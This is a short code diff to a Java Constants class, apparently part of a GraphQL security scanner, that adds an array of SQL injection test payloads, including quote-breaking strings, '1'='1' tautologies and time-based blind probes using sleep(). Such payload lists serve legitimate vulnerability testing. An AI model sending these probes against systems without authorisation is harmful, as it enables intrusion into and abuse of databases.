@@ -11,4 +11,13 @@ public class Constants {
     static public String GRAPHQL_SPACE = " ";
     static public String GRAPHQL_NEW_LINE = "\n";
     static public String GRAPHQL_TAB = "    ";
+
+    static public String[] payloads = new String[]{
+            "",
+            "'",
+            "'+and+'1'='1",
+            "'+or+'1'='1",
+            "'+and+sleep(10)%23",
+            "+and+sleep(5)+-- "
+    };
 }
